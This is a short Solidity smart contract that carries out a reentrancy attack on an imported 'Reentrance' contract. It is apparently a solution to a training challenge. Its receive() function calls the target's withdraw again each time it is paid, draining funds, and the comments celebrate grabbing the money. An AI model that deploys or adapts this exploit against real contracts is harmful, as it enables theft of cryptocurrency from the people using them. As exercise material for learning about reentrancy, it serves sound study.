// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Reentrance.sol";

contract Evil11 {
    Reentrance target;

    constructor(address payable _target) public {
        target = Reentrance(_target);
    }

    function hackit() external payable {
        // donate so we are eligble to withdraw
        target.donate{value: msg.value}(address(this));

        target.withdraw(msg.value);
    }

    function withdraw() external {
        // let's grab those moniez 
        address(msg.sender).call{value: address(this).balance}("");
    }

    receive() external payable {
      // drain 'em 
      target.withdraw(msg.value);
  }
}